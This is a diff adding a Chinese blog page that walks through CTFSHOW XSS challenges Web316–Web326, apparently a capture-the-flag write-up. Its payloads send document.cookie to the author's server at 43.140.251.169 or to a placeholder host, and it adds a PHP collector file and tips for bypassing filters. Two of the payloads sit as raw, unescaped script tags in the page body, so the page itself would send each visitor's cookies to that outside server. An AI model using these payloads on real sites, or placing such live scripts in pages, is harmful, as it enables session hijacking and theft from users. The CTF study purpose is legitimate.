@@ -1,0 +1,589 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
+  </script>
+
+  <meta name="description" content="XSS记录,X死你">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CTFSHOW-XSS">
+<meta property="og:url" content="http://example.com/2022/10/03/CTFSHOW-XSS/index.html">
+<meta property="og:site_name" content="Boogiepop Don&#39;t Laugh">
+<meta property="og:description" content="XSS记录,X死你">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://boogipop-1314143616.cos.ap-beijing.myqcloud.com/image-20221002180134597.png">
+<meta property="og:image" content="https://boogipop-1314143616.cos.ap-beijing.myqcloud.com/image-20221002180813878.png">
+<meta property="og:image" content="https://boogipop-1314143616.cos.ap-beijing.myqcloud.com/image-20221002181035940.png">
+<meta property="og:image" content="https://boogipop-1314143616.cos.ap-beijing.myqcloud.com/image-20221002181309118.png">
+<meta property="og:image" content="https://boogipop-1314143616.cos.ap-beijing.myqcloud.com/image-20221002181406862.png">
+<meta property="og:image" content="https://boogipop-1314143616.cos.ap-beijing.myqcloud.com/image-20221002190835459.png">
+<meta property="og:image" content="https://boogipop-1314143616.cos.ap-beijing.myqcloud.com/image-20221002191046673.png">
+<meta property="og:image" content="c:\Users\22927\AppData\Roaming\Typora\typora-user-images\image-20221002213031902.png">
+<meta property="og:image" content="https://boogipop-1314143616.cos.ap-beijing.myqcloud.com/image-20221002213207087.png">
+<meta property="og:image" content="c:\Users\22927\AppData\Roaming\Typora\typora-user-images\image-20221002213240163.png">
+<meta property="og:image" content="https://boogipop-1314143616.cos.ap-beijing.myqcloud.com/image-20221002213325874.png">
+<meta property="og:image" content="https://boogipop-1314143616.cos.ap-beijing.myqcloud.com/image-20221002214005030.png">
+<meta property="og:image" content="https://boogipop-1314143616.cos.ap-beijing.myqcloud.com/image-20221002214017238.png">
+<meta property="og:image" content="https://boogipop-1314143616.cos.ap-beijing.myqcloud.com/image-20221003011433495.png">
+<meta property="og:image" content="https://boogipop-1314143616.cos.ap-beijing.myqcloud.com/image-20221003011512840.png">
+<meta property="og:image" content="https://boogipop-1314143616.cos.ap-beijing.myqcloud.com/image-20221003011846387.png">
+<meta property="article:published_time" content="2022-10-02T17:32:46.589Z">
+<meta property="article:modified_time" content="2022-10-02T17:32:21.975Z">
+<meta property="article:author" content="Boogipop">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://boogipop-1314143616.cos.ap-beijing.myqcloud.com/image-20221002180134597.png">
+
+<link rel="canonical" href="http://example.com/2022/10/03/CTFSHOW-XSS/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>CTFSHOW-XSS | Boogiepop Don't Laugh</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+    <a target="_blank" rel="noopener" href="https://github.com/Boogipop/Boogipop.github.io" class="github-corner" aria-label="View source on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#70B7FD; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>  
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Boogiepop Don't Laugh</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">不吉波普不笑</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-schedule">
+
+    <a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>日程表</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/10/03/CTFSHOW-XSS/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/pic.png">
+      <meta itemprop="name" content="Boogipop">
+      <meta itemprop="description" content="Are you still in pain?">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Boogiepop Don't Laugh">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          CTFSHOW-XSS
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2022-10-03 01:32:46 / 修改时间：01:32:21" itemprop="dateCreated datePublished" datetime="2022-10-03T01:32:46+08:00">2022-10-03</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/XSS/" itemprop="url" rel="index"><span itemprop="name">XSS</span></a>
+                </span>
+            </span>
+
+          
+            <div class="post-description">XSS记录,X死你</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="Web316"><a href="#Web316" class="headerlink" title="Web316"></a>Web316</h2><p>接下来开启XSS的时代！其实我老早就想玩XSS了，只是我觉得基础没打牢还不行</p>
+<p><img src="https://boogipop-1314143616.cos.ap-beijing.myqcloud.com/image-20221002180134597.png" alt="image-20221002180134597"></p>
+<p>题目页面如上，意思就是点了生成链接后，这个靶场后台有个机器人，会自动点进这个链接，达到XSS的目的，第一次讲，就来讲的很全面！</p>
+<h3 id="语法基础"><a href="#语法基础" class="headerlink" title="语法基础"></a>语法基础</h3><p>我们学XSS肯定是需要一点js和DOM基础的（虽然我是零基础，但是慢慢学吧QWQ)，dom就是document，是html的语法</p>
+<p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/zyhlwzy/article/details/7366814">https://blog.csdn.net/zyhlwzy/article/details/7366814</a></p>
+<p>​			<a target="_blank" rel="noopener" href="https://www.yisu.com/zixun/143876.html">https://www.yisu.com/zixun/143876.html</a></p>
+<ul>
+<li><p><code>document.cookie=</code>:设置或者是获取cookie，假如你&#x3D;后面赋值了那就是设置，没有那就是获取cookie的值：</p>
+<p><img src="https://boogipop-1314143616.cos.ap-beijing.myqcloud.com/image-20221002180813878.png" alt="image-20221002180813878"></p>
+</li>
+<li><p><code>document.location.href=&quot;&quot;:</code>这是转发语句，打开这个网址之后就会跳转到另一个网址</p>
+</li>
+</ul>
+<p>​	假如：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&#x27;http://43.140.251.169/XSS.php&#x27;</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>我们打开我们的html文件后，就自动跳转到这个页面，这叫做转发：</p>
+<p><img src="https://boogipop-1314143616.cos.ap-beijing.myqcloud.com/image-20221002181035940.png" alt="image-20221002181035940"></p>
+<ul>
+<li>linux中的nc指令：<a target="_blank" rel="noopener" href="https://www.runoob.com/linux/linux-comm-nc.html">https://www.runoob.com/linux/linux-comm-nc.html</a></li>
+</ul>
+<blockquote>
+<ul>
+<li>-g&lt;网关&gt; 设置路由器跃程通信网关，最多可设置8个。</li>
+<li>-G&lt;指向器数目&gt; 设置来源路由指向器，其数值为4的倍数。</li>
+<li>-h 在线帮助。</li>
+<li>-i&lt;延迟秒数&gt; 设置时间间隔，以便传送信息及扫描通信端口。</li>
+<li>-l 使用监听模式，管控传入的资料。</li>
+<li>-n 直接使用IP地址，而不通过域名服务器。</li>
+<li>-o&lt;输出文件&gt; 指定文件名称，把往来传输的数据以16进制字码倾倒成该文件保存。</li>
+<li>-p&lt;通信端口&gt; 设置本地主机使用的通信端口。</li>
+<li>-r 乱数指定本地与远端主机的通信端口。</li>
+<li>-s&lt;来源位址&gt; 设置本地主机送出数据包的IP地址。</li>
+<li>-u 使用UDP传输协议。</li>
+<li>-v 显示指令执行过程。</li>
+<li>-w&lt;超时秒数&gt; 设置等待连线的时间。</li>
+<li>-z 使用0输入&#x2F;输出模式，只在扫描通信端口时使用</li>
+</ul>
+</blockquote>
+<p>​	我们常用的nc指令就是<code>nc -lvnp 端口</code>，如<code>nc -lvnp 7777</code>，就是监听本地的7777端口，当外部机子对本地机子传入了什么文件，传入了什么参数都可以监听</p>
+<h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>知道以上基础就好说了</p>
+<p><img src="https://boogipop-1314143616.cos.ap-beijing.myqcloud.com/image-20221002181309118.png"></p>
+<p>题目的意思是cookie是admin，所以要用靶场的cookie，而不是我们本地的cookie</p>
+<p>我们现在远程服务器写一个XSS.PHP：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="number">1</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$content</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;flag.txt&#x27;</span>,<span class="variable">$content</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;no date input&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>然后直接payload：</p>
+ <script>document.location.href='http://43.140.251.169/XSS.php?1='+document.cookie</script>
+
+<p>+是js里的连接符，这样就把cookie带出来了，我们在我们远程服务器目录下可以看到flag.txt:</p>
+<p><img src="https://boogipop-1314143616.cos.ap-beijing.myqcloud.com/image-20221002181406862.png" alt="image-20221002181406862"></p>
+<p>是不是很通俗易懂呢？</p>
+<h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>我们可以用nc指令去监听，payload在下面选一个就好了：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&#x27;http://xxx:7777/&#x27;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">&quot;window.open(&#x27;http://xxx:7777/&#x27;+document.cookie)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">&quot;window.open(&#x27;http://xxx:7777/&#x27;+document.cookie)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">onfocus</span>=<span class="string">&quot;window.open(&#x27;http://xxx:7777/&#x27;+document.cookie)&quot;</span> <span class="attr">autofocus</span>&gt;</span><span class="tag">&lt;/<span class="name">input</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">onload</span>=<span class="string">&quot;window.open(&#x27;http://xxx:7777/&#x27;+document.cookie)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>我们用第一个，下面几条的语句我们接下来题目慢慢去发现，payload：</p>
+<script>document.location.href='http://43.140.251.169:7777/'+document.cookie</script>
+
+<p>虽然每次监听只能监听一个，但是我们能nc多次：</p>
+<p>我们用的是腾讯云服务器，端口开发在这！反正我这台机子也没啥，我也不打码了QWQ，7777就是我设置的用来监听的端口</p>
+<p><img src="https://boogipop-1314143616.cos.ap-beijing.myqcloud.com/image-20221002190835459.png" alt="image-20221002190835459"></p>
+<p>然后我们 <code>nc -lvnp 7777</code>:</p>
+<p><img src="https://boogipop-1314143616.cos.ap-beijing.myqcloud.com/image-20221002191046673.png" alt="image-20221002191046673"></p>
+<p>flag成功被带出来拉！（这里要重复nc哦，因为我们自己本身也点了,不可以X自己）</p>
+<h2 id="Web317"><a href="#Web317" class="headerlink" title="Web317"></a>Web317</h2><p><img src="C:\Users\22927\AppData\Roaming\Typora\typora-user-images\image-20221002213031902.png" alt="image-20221002213031902"></p>
+<p>页面没改变，但是经过测试发现过滤了script</p>
+<p>换一种标签就可以了，这下面选一个即可</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">&quot;window.open(&#x27;http://xxx:7777/&#x27;+document.cookie)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">&quot;window.open(&#x27;http://xxx:7777/&#x27;+document.cookie)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">onfocus</span>=<span class="string">&quot;window.open(&#x27;http://xxx:7777/&#x27;+document.cookie)&quot;</span> <span class="attr">autofocus</span>&gt;</span><span class="tag">&lt;/<span class="name">input</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">onload</span>=<span class="string">&quot;window.open(&#x27;http://xxx:7777/&#x27;+document.cookie)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>来讲一下这些标签的意思：</p>
+<p><code>&lt;iframe&gt;</code>:<a target="_blank" rel="noopener" href="https://wangdoc.com/html/iframe.html%E6%A0%87%E7%AD%BE%E7%94%A8%E4%BA%8E%E5%9C%A8%E7%BD%91%E9%A1%B5%E9%87%8C%E9%9D%A2%E5%B5%8C%E5%85%A5%E5%85%B6%E4%BB%96%E7%BD%91%E9%A1%B5">https://wangdoc.com/html/iframe.html标签用于在网页里面嵌入其他网页</a></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;https://www.example.com&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">width</span>=<span class="string">&quot;100%&quot;</span> <span class="attr">height</span>=<span class="string">&quot;500&quot;</span> <span class="attr">frameborder</span>=<span class="string">&quot;0&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">allowfullscreen</span> <span class="attr">sandbox</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://www.example.com&quot;</span>&gt;</span>点击打开嵌入页面<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>上面的代码在当前网页嵌入<code>https://www.example.com</code>，显示区域的宽度是<code>100%</code>，高度是<code>500</code>像素。如果当前浏览器不支持<code>&lt;iframe&gt;</code>，则会显示一个链接，让用户点击。</p>
+<p><code>Onload</code>：<a target="_blank" rel="noopener" href="https://www.runoob.com/jsref/event-onload.html">https://www.runoob.com/jsref/event-onload.html</a></p>
+<p><img src="https://boogipop-1314143616.cos.ap-beijing.myqcloud.com/image-20221002213207087.png" alt="image-20221002213207087"></p>
+<p><code>Window</code>：<a target="_blank" rel="noopener" href="https://www.runoob.com/js/js-window.html">https://www.runoob.com/js/js-window.html</a></p>
+<p><img src="C:\Users\22927\AppData\Roaming\Typora\typora-user-images\image-20221002213240163.png" alt="image-20221002213240163"></p>
+<p>这里不用window，直接把onload后面的东西改为documen.location.href也可以</p>
+<p><code>Window.open</code>:<a target="_blank" rel="noopener" href="https://www.runoob.com/jsref/met-win-open.html">https://www.runoob.com/jsref/met-win-open.html</a></p>
+<p><img src="https://boogipop-1314143616.cos.ap-beijing.myqcloud.com/image-20221002213325874.png" alt="image-20221002213325874"></p>
+<p><code>onfocus</code>,<code>autofocus</code>:<a target="_blank" rel="noopener" href="https://www.runoob.com/tags/ev-onfocus.html">https://www.runoob.com/tags/ev-onfocus.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.runoob.com/tags/att-input-autofocus.html">https://www.runoob.com/tags/att-input-autofocus.html</a></p>
+<p>onfocus是input标签里的一个属性，表示当获取焦点时运行JavaScript脚本</p>
+<p>autofocus也是input里的一个标签，和onfocus一般一起用，表示自动获取焦点，打个比方，假如有一个输入框，你点击后输入框就会变色，假如加了autofocus你不用点击输入框他就会自动变色</p>
+<p>接下来可以在payload跳转到我们自己的VPS，也可以让它访问7777端口再监听</p>
+<p><code>&lt;body onload=&quot;document.location.href=&#39;http://43.140.251.169/XSS.php?1=&#39;+document.cookie&quot;&gt;&lt;/body&gt;</code></p>
+<p>or</p>
+<p><code>&lt;body onload=&quot;window.open(&#39;http://43.140.251.169/XSS.php?1=&#39;+document.cookie)&quot;&gt;&lt;/body&gt;</code></p>
+<p><img src="https://boogipop-1314143616.cos.ap-beijing.myqcloud.com/image-20221002214005030.png" alt="image-20221002214005030"></p>
+<p><img src="https://boogipop-1314143616.cos.ap-beijing.myqcloud.com/image-20221002214017238.png" alt="image-20221002214017238"></p>
+<p>解决~</p>
+<h2 id="Web318"><a href="#Web318" class="headerlink" title="Web318"></a>Web318</h2><p>和上一题没啥区别，网上说ban了img，有啥问题吗,payload还是一样的</p>
+<h2 id="Web319"><a href="#Web319" class="headerlink" title="Web319"></a>Web319</h2><p>同上，不知道过滤了什么</p>
+<h2 id="Web320"><a href="#Web320" class="headerlink" title="Web320"></a>Web320</h2><p>经过测试发现ban掉了空格，可以用<code>%0c</code>,%09,<code>/**/</code>注释符或者<code>/</code>去绕过</p>
+<p><code>&lt;body/**/onload=&quot;document.location.href=&#39;http://43.140.251.169/XSS.php?1=&#39;+document.cookie&quot;&gt;&lt;/body&gt;</code></p>
+<p>%0c和%09不能直接在输入框打出，要在hackbar中url解码然后再复制过去</p>
+<h2 id="Web321"><a href="#Web321" class="headerlink" title="Web321"></a>Web321</h2><p>一开始没反应过来ban了什么，结果是ban了XSS这个字符串，没啥用</p>
+<p>payload同上</p>
+<p><code>&lt;body/**/onload=&quot;document.location.href=&#39;http://43.140.251.169/X.php?1=&#39;+document.cookie&quot;&gt;&lt;/body&gt;</code></p>
+<h2 id="Web323-Web326"><a href="#Web323-Web326" class="headerlink" title="Web323-Web326"></a>Web323-Web326</h2><p>增加了什么过滤我不知道，我只知道上一题的payload还是可以X出来</p>
+<h2 id="绕过总结"><a href="#绕过总结" class="headerlink" title="绕过总结"></a>绕过总结</h2><h4 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h4><ul>
+<li>&#x2F;**&#x2F; :注释符绕过</li>
+<li>%09,%0c: tab和换页符绕过</li>
+<li>&#x2F;：直接一个斜杠绕过</li>
+</ul>
+<h4 id="过滤某些特殊字符"><a href="#过滤某些特殊字符" class="headerlink" title="过滤某些特殊字符"></a>过滤某些特殊字符</h4><ul>
+<li><code>document.write(String.fromCharCode(ascii码))</code>：<a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/API/Document/write">https://developer.mozilla.org/zh-CN/docs/Web/API/Document/write</a></li>
+</ul>
+<p>首先document.write将一个文本字符串写入一个由 <a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/API/Document/open"><code>document.open()</code></a> 打开的文档流（document stream）。</p>
+<p>示例：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;<span class="name">code</span>&gt;</span>document.write()<span class="tag">&lt;/<span class="name">code</span>&gt;</span> example<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">function</span> <span class="title function_">newContent</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="title function_">open</span>();</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;h1&gt;Out with the old - in with the new!&lt;/h1&gt;&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">        <span 